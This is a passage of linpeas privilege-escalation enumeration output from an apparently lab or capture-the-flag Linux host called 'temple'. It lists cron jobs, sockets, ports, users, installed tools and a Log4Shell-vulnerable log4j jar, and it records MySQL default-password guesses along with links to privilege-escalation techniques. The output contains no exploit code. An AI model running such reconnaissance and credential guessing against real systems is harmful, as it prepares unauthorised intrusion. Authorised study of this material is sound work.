# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/home/bill/webapp
@reboot sleep 30; cd /home/bill/webapp; /usr/bin/python3 /home/bill/webapp/webapp.py
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x   2 root root 4096 Jul 23  2021 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rw-r--r--   1 root root  589 Jun 26  2018 mdadm
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  190 Jul 25  2018 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x   2 root root 4096 Oct  3  2021 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jun 26  2018 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  214 Jun 27  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Jul 25  2018 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Jul 25  2018 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Oct  3  2021 .
drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  403 Aug 23  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/home/bill/webapp
@reboot sleep 30; cd /home/bill/webapp; /usr/bin/python3 /home/bill/webapp/webapp.py

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Wed 2023-01-25 00:38:16 UTC  3min 34s left Tue 2023-01-24 23:40:13 UTC  54min ago ua-messaging.timer           ua-messaging.service
Wed 2023-01-25 02:51:01 UTC  2h 16min left Tue 2023-01-24 23:40:13 UTC  54min ago motd-news.timer              motd-news.service
Wed 2023-01-25 06:13:09 UTC  5h 38min left Tue 2023-01-24 23:40:13 UTC  54min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2023-01-25 08:16:50 UTC  7h left       Tue 2023-01-24 23:40:13 UTC  54min ago apt-daily.timer              apt-daily.service
Wed 2023-01-25 23:54:51 UTC  23h left      Tue 2023-01-24 23:54:51 UTC  39min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-01-30 00:00:00 UTC  4 days left   Tue 2023-01-24 23:40:13 UTC  54min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/11316/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/11316/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/11316/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/11316/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/11316/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 669 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
:1.1                                 663 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
:1.2                                 762 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.26                              10745 busctl          bill             :1.26         cron.service              -          -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.5                                 767 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
:1.6                                 827 polkitd         root             :1.6          polkit.service            -          -                  
:1.8                                 809 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -                  
:1.9                                 819 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             767 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           827 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               762 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             663 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             669 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
temple
127.0.0.1	localhost.localdomain	localhost
::1		localhost6.localdomain6	localhost6

::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.181.180  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::29:1ff:fe93:327b  prefixlen 64  scopeid 0x20<link>
        ether 02:29:01:93:32:7b  txqueuelen 1000  (Ethernet)
        RX packets 2866  bytes 1753567 (1.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2105  bytes 1149958 (1.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 404  bytes 36691 (36.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 404  bytes 36691 (36.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:61337           0.0.0.0:*               LISTEN      1289/python3        
tcp        0      0 0.0.0.0:7               0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:9600          :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),30(dip),46(plugdev)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
bill:x:1000:1000:bill:/home/bill:/bin/bash
frankie:x:1001:1001:,,,:/home/frankie:/bin/bash
jenny:x:1002:1002::/home/jenny:/bin/sh
princess:x:1003:1003:,,,:/home/princess:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),30(dip),46(plugdev)
uid=1001(frankie) gid=1001(frankie) groups=1001(frankie),27(sudo)
uid=1002(jenny) gid=1002(jenny) groups=1002(jenny)
uid=1003(princess) gid=1003(princess) groups=1003(princess)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=113(mysql) groups=113(mysql)
uid=112(telnetd) gid=114(telnetd) groups=114(telnetd),43(utmp)
uid=113(ftp) gid=115(ftp) groups=115(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=999(logstash) gid=999(logstash) groups=999(logstash)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 00:36:53 up 57 min,  0 users,  load average: 2.95, 3.02, 2.38
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Tue Jan 24 23:40:07 2023   still running                         0.0.0.0
reboot   system boot  Mon Oct  4 10:45:03 2021 - Mon Oct  4 10:47:43 2021  (00:02)     0.0.0.0

wtmp begins Mon Oct  4 10:23:13 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/socat
/usr/bin/sudo

╔══════════╣ Installed Compilers
ii  g++                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler
ii  g++-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL
mysql  Ver 15.1 Distrib 10.1.48-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 May  3  2021 /etc/mysql/mariadb.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Jul 24  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2021-09-28T11:01:16
httpd Not Found

Nginx version: nginx Not Found

./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jul 24  2021 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Jul 24  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jul 24  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jul 24  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Jul 23  2021 /etc/ldap


╔══════════╣ Searching Log4Shell vulnerable libraries
/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.14.0.jar

╔══════════╣ Searching ssl/ssh files
ChallengeResponseAuthentication no
PermitRootLogin yes
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core/11316/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/11316/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/11316/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/11316/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/11316/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/11316/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/11316/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/11316/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/11316/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/11316/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/11316/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/11316/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/11316/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/11316/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core/11316/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core/11316/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core/11316/etc/ssl/certs/ca-certificates.crt
/snap/core/11316/etc/ssl/certs/CA_Disig_Root_R2.pem
/snap/core/11316/etc/ssl/certs/Certigna.pem
3640PSTORAGE_CERTSBIN

gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: waiting for the agent to come up ... (5s)
gpg-connect-agent: waiting for the agent to come up ... (4s)
gpg-connect-agent: connection to agent established
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Oct  3  2021 /etc/pam.d
-rw-r--r-- 1 root root 2133 Feb 10  2018 /etc/pam.d/sshd


╔══════════╣ Searching logstash files
/etc/default/logstash
/etc/logstash
/usr/share/doc/logstash
/usr/share/logstash
/usr/share/logstash/bin/logstash
/usr/share/logstash/lib/pluginmanager/templates/codec-plugin/lib/logstash
/usr/share/logstash/lib/pluginmanager/templates/filter-plugin/lib/logstash
/usr/share/logstash/lib/pluginmanager/templates/input-plugin/lib/logstash
/usr/share/logstash/lib/pluginmanager/templates/output-plugin/lib/logstash
/usr/share/logstash/logstash-core/lib/logstash
/usr/share/logstash/modules/fb_apache/configuration/logstash
/usr/share/logstash/modules/netflow/configuration/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-avro-3.2.4-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-cef-6.2.3-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-collectd-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-dots-3.0.6/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn_lines-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-es_bulk-3.0.8/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-fluent-3.4.0-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-graphite-3.0.6/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json_lines-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-line-3.1.1/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-msgpack-3.1.0-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-multiline-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-netflow-4.2.2/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-plain-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-rubydebug-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-devutils-1.3.6-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-aggregate-2.9.2/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-anonymize-3.0.6/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-cidr-3.1.3-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-clone-4.1.1/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-csv-3.1.1/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/vendor/jar-dependencies/org/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-de_dot-1.0.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/vendor/jars/org/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dns-3.1.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-drop-3.0.5/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-elasticsearch-3.9.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-fingerprint-3.3.2/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/vendor/jar-dependencies/org/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-grok-4.4.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-http-1.0.2/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-json-3.2.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-kv-4.5.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-memcached-1.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-metrics-4.0.7/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-mutate-3.5.2/lib/logstash
